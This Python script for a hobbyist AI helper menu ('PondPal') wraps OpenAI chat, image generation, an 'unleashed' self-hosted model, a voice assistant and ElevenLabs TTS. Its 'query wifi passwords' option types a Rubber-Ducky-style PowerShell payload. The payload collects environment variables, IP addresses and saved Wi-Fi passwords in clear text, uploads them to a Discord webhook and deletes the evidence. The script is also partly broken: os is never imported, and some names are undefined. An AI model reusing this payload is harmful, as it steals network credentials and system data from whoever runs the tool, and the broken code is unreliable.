import requests
import sys
import openai
import pygame
import time
from elevenlabs.client import ElevenLabs
from elevenlabs import Voice, VoiceSettings
from pydub import AudioSegment
from io import BytesIO
import speech_recognition as sr
import webbrowser
import pyperclip
import pyautogui as pag
import pyautogui
import threading
API_KEY = 'elevel lab api key'
def PrintSpeak():
    print("""


   SSSSSSSSSSSSSSS                                                        kkkkkkkk           
 SS:::::::::::::::S                                                       k::::::k           
S:::::SSSSSS::::::S                                                       k::::::k           
S:::::S     SSSSSSS                                                       k::::::k           
S:::::S           ppppp   ppppppppp       eeeeeeeeeeee    aaaaaaaaaaaaa    k:::::k    kkkkkkk
S:::::S           p::::ppp:::::::::p    ee::::::::::::ee  a::::::::::::a   k:::::k   k:::::k 
 S::::SSSS        p:::::::::::::::::p  e::::::eeeee:::::eeaaaaaaaaa:::::a  k:::::k  k:::::k  
  SS::::::SSSSS   pp::::::ppppp::::::pe::::::e     e:::::e         a::::a  k:::::k k:::::k   
    SSS::::::::SS  p:::::p     p:::::pe:::::::eeeee::::::e  aaaaaaa:::::a  k::::::k:::::k    
       SSSSSS::::S p:::::p     p:::::pe:::::::::::::::::e aa::::::::::::a  k:::::::::::k     
            S:::::Sp:::::p     p:::::pe::::::eeeeeeeeeee a::::aaaa::::::a  k:::::::::::k     
            S:::::Sp:::::p    p::::::pe:::::::e         a::::a    a:::::a  k::::::k:::::k    
SSSSSSS     S:::::Sp:::::ppppp:::::::pe::::::::e        a::::a    a:::::a k::::::k k:::::k   
S::::::SSSSSS:::::Sp::::::::::::::::p  e::::::::eeeeeeeea:::::aaaa::::::a k::::::k  k:::::k  
S:::::::::::::::SS p::::::::::::::pp    ee:::::::::::::e a::::::::::aa:::ak::::::k   k:::::k 
 SSSSSSSSSSSSSSS   p::::::pppppppp        eeeeeeeeeeeeee  aaaaaaaaaa  aaaakkkkkkkk    kkkkkkk
                   p:::::p                                                                   
                   p:::::p                                                                   
                  p:::::::p                                                                  
                  p:::::::p                                                                  
                  p:::::::p                                                                  
                  ppppppppp                                                                  



    """)
def clear_console():
    command = 'clear'
    if os.name in ('nt', 'dos'):  # If the system is Windows, use cls
        command = 'cls'
    os.system(command)

clear_console()
clear_console()
clear_console()
print('-------------------------------------------------------------------------------------------------------------------------|')
print("""                                                                                                                         |
   ▄███████▄  ▄██████▄  ███▄▄▄▄   ████████▄     ▄███████▄    ▄████████  ▄█               ▄████████  ▄█                   |
  ███    ███ ███    ███ ███▀▀▀██▄ ███   ▀███   ███    ███   ███    ███ ███              ███    ███ ███                   |
  ███    ███ ███    ███ ███   ███ ███    ███   ███    ███   ███    ███ ███              ███    ███ ███▌                  |
  ███    ███ ███    ███ ███   ███ ███    ███   ███    ███   ███    ███ ███              ███    ███ ███▌                  |
▀█████████▀  ███    ███ ███   ███ ███    ███ ▀█████████▀  ▀███████████ ███            ▀███████████ ███▌                  |
  ███        ███    ███ ███   ███ ███    ███   ███          ███    ███ ███              ███    ███ ███                   |
  ███        ███    ███ ███   ███ ███   ▄███   ███          ███    ███ ███▌    ▄        ███    ███ ███                   |
 ▄████▀       ▀██████▀   ▀█   █▀  ████████▀   ▄████▀        ███    █▀  █████▄▄██        ███    █▀  █▀                    |
                                                                       ▀                                                 |
                                                                                                                         |
                                                                                                                         |
                                                                                                                         |-------------|""")
print('|         Welcome to PondPal!                                         _    _                                                           |')
print('|options include                                                     (o)--(o)                                                          |')
print("|image generation                     image generation              /.______.\                                                         |")
print("|use gpt3.5                           3.5                           \________/                                                         |")
print("|fix me grammar                       grammar                      ./        \.                                                        |")
print("|chat w unleased unblocked AI         unleashed                   ( .        , )                                                       |")
print("|chat w many AIs then filter          multimodel                   \ \_\\//_/ /                                                         |")
print('|                                                                   ~~  ~~  ~~                                                         |')
print("|use friday to start speach assistant friday                                                                                           |")
print("|query wifi passwords                 wifi                                                                                             |")
print("|use tts module                       tts                                                                                              |")
print("|phi                                  free3                                                                                            |")
print("|phi 3 corrects joe grammar           grammar3                                                                                         |")
print("|--------------------------------------------------------------------------------------------------------------------------------------|")


def querywifi():
    import time as tim

    # Wait for 2 seconds to give you time to switch to the window where you want to perform this action
    time.sleep(2)

    # Press the Windows key + R to open the run menu
    pyautogui.hotkey('win', 'r')

    time.sleep(1)
    pyautogui.typewrite("powershell")
    pyautogui.press('enter')
    time.sleep(1)
    pag.typewrite(
        """$url="discord webhook";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit""")
    pag.press('enter')
    restart_script()

# Get text from the clipboard


# Explicitly pass the API key
api_key = os.getenv('API_Key')
client = openai.OpenAI(api_key="sk-API_Key")
global globaloutputofthreading_gpt4
global globaloutputofthreading_gpt3
global globaloutputofthreading_unleashed
def chat_with_server():
    server_url = 'url to PondPal Ollama Server'

    while True:
        # Prompt the user for input
        user_message = input("You: ")
        if user_message.lower() == 'restart':
            restart_script()
        # Exit the loop if the user types 'exit'
        if user_message.lower() == 'bye':
            print("Exiting chat.")
            break

        try:
            # Send the user message to the server
            response = requests.post(server_url, json={'message': user_message})

            # Check if the request was successful
            if response.status_code == 200:
                # Extract the AI response from the server's reply
                ai_response = response.json().get('response', 'No response from AI.')
                print(f"AI: {ai_response}")
            else:
                print(f"Error: Received status code {response.status_code} from the server.")
        except Exception as e:
            print(f"An error occurred: {e}")
"""
 def free3():
    server_url = 'http://147.185.221.19:1037/free3'

    while True:
        # Prompt the user for input
        user_message = input("You: ")
        if user_message.lower() == 'restart':
            restart_script()
        # Exit the loop if the user types 'exit'
        if user_message.lower() == 'bye':
            print("Exiting chat.")
            break

        try:
            # Send the user message to the server
            response = requests.post(server_url, json={'message': user_message})

            # Check if the request was successful
            if response.status_code == 200:
                # Extract the AI response from the server's reply
                ai_response = response.json().get('response', 'No response from AI.')
                print(f"AI: {ai_response}")
            else:
                print(f"Error: Received status code {response.status_code} from the server.")
        except Exception as e:
            print(f"An error occurred: {e}")
"""

import requests


def free3():
    server_url = 'url to PondPal Ollama Server'

    while True:
        print("Enter your message line by line. Type 'send' when done.")
        input_lines = []
        while True:
            line = input()
            if line.lower() == 'send':
                break
            if line.lower() == 'restart':
                restart_script()
            input_lines.append(line)

        user_message = "\n".join(input_lines)

        if user_message.lower() == 'restart':
            restart_script()

        if user_message.lower() == 'bye':
            print("Exiting chat.")
            break

        try:
            response = requests.post(server_url, json={'message': user_message})
            if response.status_code == 200:
                ai_response = response.json().get('response', 'No response from AI.')
                print(f"AI: {ai_response}")
            else:
                print(f"Error: Received status code {response.status_code} from the server.")
        except Exception as e:
            print(f"An error occurred: {e}")


def grammarfree3():
    server_url = 'url to PondPal Ollama Server'

    clipboard_content = pyperclip.paste()
    user_message = "Correct the grammar of the following sentence, ensuring the output is only the grammatically corrected version: "+clipboard_content

    try:
        # Send the user message to the server
        response = requests.post(server_url, json={'message': user_message})

        # Check if the request was successful
        if response.status_code == 200:
            # Extract the AI response from the server's reply
            ai_response = response.json().get('response', 'No response from AI.')
            print(f"AI: {ai_response}")
            pyperclip.copy(ai_response)
            restart_script()
        else:
            print(f"Error: Received status code {response.status_code} from the server.")
    except Exception as e:
        print(f"An error occurred: {e}")


def chat_with_gpt4(stored_messages, user_input, model="gpt-4", temperature=0.5):
    print("running 4")
    messages = stored_messages + [{"role": "user", "content": user_input}]
    response = client.chat.completions.create(
        model=model,
        messages=messages
    )
    message_content = response.choices[0].message.content
    messages.append({"role": "assistant", "content": message_content})
    return message_content, messages
def chat_with_gpt3(stored_messages, user_input, model="gpt-3.5-turbo", temperature=0.5):
  print("running turbo")
  messages = stored_messages + [{"role": "user", "content": user_input}]
  response = client.chat.completions.create(
      model=model,
      messages=messages
  )
  message_content = response.choices[0].message.content
  messages.append({"role": "assistant", "content": message_content})
  return message_content, messages

def gpt4loop():
  instructions = "You are a helpful assistant that sometimes make puns and spells words fun. The overall chat should be focused on providing to the point information"
  stored_messages = [{"role": "system", "content": instructions}]
  user_input = input("Say something to ChatGPT: ")

  while user_input.lower() != "bye":
    if(user_input.lower() == "restart"):
      restart_script()
    else:
      reply, stored_messages = chat_with_gpt4(stored_messages, user_input)
      print(f"ChatGPT: {reply}")
      user_input = input("\nSay something else to ChatGPT (or type 'bye' to exit): ")

  print("ChatGPT has left the conversation. Talk to you later!")

def gpt3loop():
      instructions = "You are a helpful assistant that sometimes make puns and spells words fun. The overall chat should be focused on providing to the point information"
      stored_messages = [{"role": "system", "content": instructions}]
      user_input = input("Say something to ChatGPT: ")

      while user_input.lower() != "bye":
        if(user_input.lower() == "restart"):
          restart_script()
        else:
          reply, stored_messages = chat_with_gpt3(stored_messages, user_input)
          print(f"ChatGPT: {reply}")
          user_input = input("\nSay something else to ChatGPT (or type 'bye' to exit): ")

      print("ChatGPT has left the conversation. Talk to you later!")
#instructions = "Correct the grammar of the following sentence, ensuring the output is only the grammatically corrected version"
def CorrectGrammar():
  clipboard_content = pyperclip.paste()
  instructions = "Correct the grammar of the following sentence, ensuring the output is only the grammatically corrected version"
  stored_messages = [{"role": "system", "content": instructions}]
  user_input = clipboard_content

  reply, stored_messages = chat_with_gpt3(stored_messages, user_input)
  print(f"ChatGPT: {reply}")
  user_input = ""
  pyperclip.copy(reply)
  restart_script()

  print("ChatGPT has left the conversation. Talk to you later!")


def restart_script():
  os.execl(sys.executable, sys.executable, *sys.argv)
def generate_image(prompt1):
  imageGenerate = client.images.generate(
  model="dall-e-3",
  prompt=prompt1,
  size="1024x1024",
  quality="standard",
  n=1,
)

  image_url = imageGenerate.data[0].url
  webbrowser.open(image_url)
  print(image_url)
  restart_script()

#-----------------------------------------------------------------
def MultiModelThreading():
    user_input = input("What do you wanna say to the multi models: ")
    if (user_input.lower() == "restart"):
        restart_script()
    thread_one_chatWgpt3 = threading.Thread(target=chat_with_gpt3_threads, args=([], user_input))
    thread_two_chatWgpt4 = threading.Thread(target=chat_with_gpt4_threads, args=([], user_input))
    thread_three_chatWunleased = threading.Thread(target=chat_with_server_threading, args=(user_input,))

    thread_one_chatWgpt3.start()
    thread_two_chatWgpt4.start()
    thread_three_chatWunleased.start()

    thread_one_chatWgpt3.join()
    thread_two_chatWgpt4.join()
    thread_three_chatWunleased.join()
    print("passing to filter AI")
    chat_with_gpt4_threads([],"take the following texts and output the commonalities"+"text 1" + globaloutputofthreading_gpt3+"text 2" + globaloutputofthreading_gpt4+ "text 3" + globaloutputofthreading_unleashed)
    print("All models have finished processing.")
    WaitForDone = input("press any key when ur done")
    restart_script()

def chat_with_server_threading(user_message):
    global globaloutputofthreading_unleashed  # Declare the variable as global
    server_url = 'url to PondPal Ollama Server'  # Example server URL

    try:
        response = requests.post(server_url, json={'message': user_message})
        if response.status_code == 200:
            ai_response = response.json().get('response', 'No response from AI.')
            print(f"AI: {ai_response}")
            globaloutputofthreading_unleashed = ai_response  # Update the global variable
        else:
            print(f"Error: Received status code {response.status_code} from the server.")
    except Exception as e:
        print(f"An error occurred: {e}")

def chat_with_gpt4_threads(stored_messages, user_input, model="gpt-4", temperature=0.5):
    global globaloutputofthreading_gpt4  # Declare the variable as global
    print("running 4")
    print("Starting chat_with_gpt4")
    messages = stored_messages + [{"role": "user", "content": user_input}]
    response = client.chat.completions.create(
        model=model,
        messages=messages
    )
    message_content = response.choices[0].message.content
    messages.append({"role": "assistant", "content": message_content})
    print("Ending chat_with_gpt4")
    print(message_content)
    globaloutputofthreading_gpt4 = message_content  # Update the global variable
    return message_content, messages

def chat_with_gpt3_threads(stored_messages, user_input, model="gpt-3.5-turbo", temperature=0.5):
    global globaloutputofthreading_gpt3  # Declare the variable as global
    print("running turbo")
    print("Starting chat_with_gpt3")
    messages = stored_messages + [{"role": "user", "content": user_input}]
    response = client.chat.completions.create(
        model=model,
        messages=messages
    )
    message_content = response.choices[0].message.content
    messages.append({"role": "assistant", "content": message_content})
    print("Ending chat_with_gpt3")
    print(message_content)
    globaloutputofthreading_gpt3 = message_content  # Update the global variable
    return message_content, messages
def listen_for_activation_word(recognizer, microphone, activation_word):
    """Listen for the activation word."""
    while True:
        with microphone as source:
            recognizer.adjust_for_ambient_noise(source)
            audio = recognizer.listen(source)
            try:
                speech = recognizer.recognize_google(audio).lower()
                if activation_word in speech:
                    print(f"Activation word '{activation_word}' detected. Starting continuous listening...")
                    return True
            except sr.UnknownValueError:
                print("Could not understand audio")
            except sr.RequestError as e:
                print(f"Could not request results; {e}")


def continuous_speech_recognition(recognizer, microphone):
    """Continuously listen to speech until a significant pause."""
    while True:
        with microphone as source:
            recognizer.adjust_for_ambient_noise(source, duration=0.5)
            audio = recognizer.listen(source, timeout=5.0, phrase_time_limit=10.0)
            try:
                speech = recognizer.recognize_google(audio)
                print("You said:", speech)
                FridayChatLoop(speech)
            except sr.WaitTimeoutError:
                print("Listening ended due to timeout.")
                break
            except sr.UnknownValueError:
                print("Could not understand audio, trying again...")
            except sr.RequestError as e:
                print(f"Could not request results; {e}")
                break


def FridayChat(stored_messages, user_input, model="gpt-3.5-turbo", temperature=0.5):
    print("running turbo")
    messages = stored_messages + [{"role": "user", "content": user_input}]
    response = client.chat.completions.create(
        model=model,
        messages=messages
    )
    message_content = response.choices[0].message.content
    messages.append({"role": "assistant", "content": message_content})
    return message_content, messages


def FridayChatLoop(user_input):
    instructions = "You are a helpful assistant that sometimes make puns and spells words fun. The overall chat should be focused on providing to the point information"
    stored_messages = [{"role": "system", "content": instructions}]

    while user_input.lower() != "goodbye":
        if (user_input.lower() == "restart"):
            restart_script()
        else:
            reply, stored_messages = FridayChat(stored_messages, user_input)
            print(f"ChatGPT: {reply}")

            activation_word = "friday"  # Customize your activation word here
            recognizer = sr.Recognizer()
            microphone = sr.Microphone()
            print("say the word")
            # Step 1: Listen for the activation word
            if listen_for_activation_word(recognizer, microphone, activation_word):
                PrintSpeak()
                # Step 2: Start continuous speech recognition
                continuous_speech_recognition(recognizer, microphone)

    print("ChatGPT has left the conversation. Talk to you later!")


def StartFriday():
    activation_word = "friday"  # Customize your activation word here
    recognizer = sr.Recognizer()
    microphone = sr.Microphone()
    print("say the word")
    # Step 1: Listen for the activation word
    if listen_for_activation_word(recognizer, microphone, activation_word):
        PrintSpeak()
        # Step 2: Start continuous speech recognition
        continuous_speech_recognition(recognizer, microphone)

def WriteExample():
    print("Please open and focus on your text editor. You have 5 seconds...")
    time.sleep(1)  # Wait for 5 seconds

    # Step 3: Type a message
    pyautogui.write('Hello, this is a test message from pyautogui!', interval=0.05)
def play_audio(file_name):
    pygame.mixer.init()
    pygame.mixer.music.load(file_name)
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        time.sleep(1)


def post_mp3_to_discord(webhook_url, mp3_file_path):
    """
    Posts an MP3 file to a Discord webhook.
    """
    with open(mp3_file_path, 'rb') as mp3_file:
        payload = {
            'files[0]': (mp3_file_path, mp3_file, 'audio/mpeg')
        }
        response = requests.post(webhook_url, files=payload)
        if response.status_code == 204:
            print("Success: MP3 file posted to Discord.")
            voicefrens()
        else:
            print(f"Failed to post MP3 file to Discord: {response.status_code} - {response.text}")
            voicefrens()

def voicefrens():
        clear_console()
        print("David")
        print("Connor")
        print("Seb")
        print('Bennett')
        select = input("Which voice do you want? (Type 'exit' to quit): ")
        if select.lower() == 'exit':
            restart_script()

        Voice_id_mubo = None

        if select.lower() == 'voice name':
            Voice_id_mubo = 'voice id'
        elif select.lower() == 'seb':
            Voice_id_mubo = 'voice id'
        elif select.lower() == 'connor':
            Voice_id_mubo = 'voice id'
        elif select.lower() == 'bennett':
            Voice_id_mubo = 'voice id'
        else:
            print("Voice not recognized, please try again.")
            return

        if Voice_id_mubo:
            text_to_speech = input("Enter your text: ")
            voice_config = Voice(
                voice_id=Voice_id_mubo,
                settings=VoiceSettings(stability=0.6, similarity_boost=1, style=1, use_speaker_boost=True)
            )

            client = ElevenLabs(api_key=API_KEY)
            audio_stream = client.generate(
                text=text_to_speech,
                voice=voice_config,
                model='eleven_multilingual_v2',
                stream=True
            )

            audio_data = b''.join(chunk for chunk in audio_stream)

            audio_segment = AudioSegment.from_file(BytesIO(audio_data), format="mp3")

            if select.lower() == 'david':
                audio_segment += 20

            file_path = select + '.mp3'
            with open(file_path, "wb") as out_file:
                audio_segment.export(out_file, format="mp3")

            print("The audio has been saved as " + select + '.mp3' + '.')
            play_audio(select + '.mp3')

            # Call to post the MP3 to Discord
            webhook_url = 'webhook'  # Replace with your Discord webhook URL
            post_mp3_to_discord(webhook_url, file_path)


if __name__ == "__main__":

  start_input = input("What would you like to do? ")

  if(start_input.lower() == "image generation"):

    print("what kinda image you wanna make")
    image_generate_prompt = input("prompt: ")
    print("makin yo image")
    generate_image(image_generate_prompt)
  if(start_input.lower() == "3.5"):
     gpt3loop()
  if (start_input.lower() == "unleashed"):
     chat_with_server()
  if (start_input.lower() == "write example"):
     WriteExample()
  if(start_input.lower() == "grammar"):
     CorrectGrammar()
  if (start_input.lower() == "multimodel"):
     MultiModelThreading()
  if (start_input.lower() == "friday"):
     StartFriday()
  if (start_input.lower() == "wifi"):
      querywifi()
  if start_input.lower() == "tts":
      voicefrens()
  if start_input.lower() == "free3":
    free3()
  if start_input.lower() == "grammar3":
    grammarfree3()
  else:
    gpt4loop()


    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press ⌘F8 to toggle the breakpoint.


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print_hi('PyCharm')

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
